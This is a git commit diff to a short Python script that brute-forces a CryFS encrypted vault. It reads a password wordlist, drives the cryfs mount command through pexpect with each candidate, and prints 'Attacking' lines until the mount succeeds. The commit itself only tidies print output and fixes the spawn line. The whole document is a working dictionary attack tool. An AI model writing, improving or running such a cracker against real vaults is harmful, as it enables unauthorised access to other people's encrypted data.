71cbc14f3ca636b33b72f469993d2c692cfe7e72
KenjiDoom <vitodevcool@protonmail.com>
2021-04-12 02:28:36 +0000

    changed print outputs, it looks cooler now

--- main.py
+++ main.py
@@ -3,12 +3,10 @@
 import pexpect
 
 
-
 def main():
     print (""" 
-
             Password list file.
-            Enter the BaseDIR & MountDIR
+            BaseDir & MountDir
             """)
 
     passfile = input("> ")
@@ -18,13 +16,11 @@ def main():
 
     for password in fileopen: # This will give it the loop
         passwords = password.strip() # Now we need a destination for the passwords
-        #command1 = pexpect.spawn('cryfs /home/%USER/.local/share/plasma-vault/test_today.enc/ /home/%USER/Vaults/test_today')
-        command1.pexpect.spawn('cryfs {0} {1}'.format(basedir, mountdir))
+        command1 = pexpect.spawn('cryfs {0} {1}'.format(basedir, mountdir))
         command1.expect('Password:')
         command1.sendline(password)
         result = command1.expect(['Error 11: Could not load config file. Did you enter the correct password?', 'Mounting filesystem. To unmount, call:'])
         if result == 0:
-            #print ("Still bruteforcing using " + password)
             print('Attacking [{0}] with: {1} '.format(basedir, password))
         elif result == 1:
             print('Done [{0}] [{1}] Password:{2}'.format(basedir, mountdir, password))
@@ -33,5 +29,5 @@ def main():
 
 
 
-
 main()
+
